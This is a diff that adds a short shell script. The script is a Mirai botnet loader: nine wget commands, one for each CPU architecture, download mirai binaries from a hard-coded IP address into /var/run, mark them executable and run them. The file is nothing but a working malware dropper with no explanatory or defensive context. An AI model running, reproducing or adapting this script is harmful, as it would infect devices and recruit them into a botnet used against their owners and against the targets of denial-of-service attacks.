@@ -1,0 +1,11 @@
+#!/bin/sh
+
+wget -c http://198.167.140.126/mirai.mips -P /var/run && chmod +x /var/run/mirai.mips && /var/run/mirai.mips
+wget -c http://198.167.140.126/mirai.arm -P /var/run && chmod +x /var/run/mirai.arm && /var/run/mirai.arm
+wget -c http://198.167.140.126/mirai.sh4 -P /var/run && chmod +x /var/run/mirai.sh4 && /var/run/mirai.sh4
+wget -c http://198.167.140.126/mirai.mpsl -P /var/run && chmod +x /var/run/mirai.mpsl && /var/run/mirai.mpsl
+wget -c http://198.167.140.126/mirai.ppc -P /var/run && chmod +x /var/run/mirai.ppc && /var/run/mirai.ppc
+wget -c http://198.167.140.126/mirai.x86 -P /var/run && chmod +x /var/run/mirai.x86 && /var/run/mirai.x86 
+wget -c http://198.167.140.126/mirai.arm5n -P /var/run && chmod +x /var/run/mirai.arm5n && /var/run/mirai.arm5n
+wget -c http://198.167.140.126/mirai.arm6 -P /var/run && chmod +x /var/run/mirai.arm6 && /var/run/mirai.arm6
+wget -c http://198.167.140.126/mirai.arm7 -P /var/run && chmod +x /var/run/mirai.arm7 && /var/run/mirai.arm7
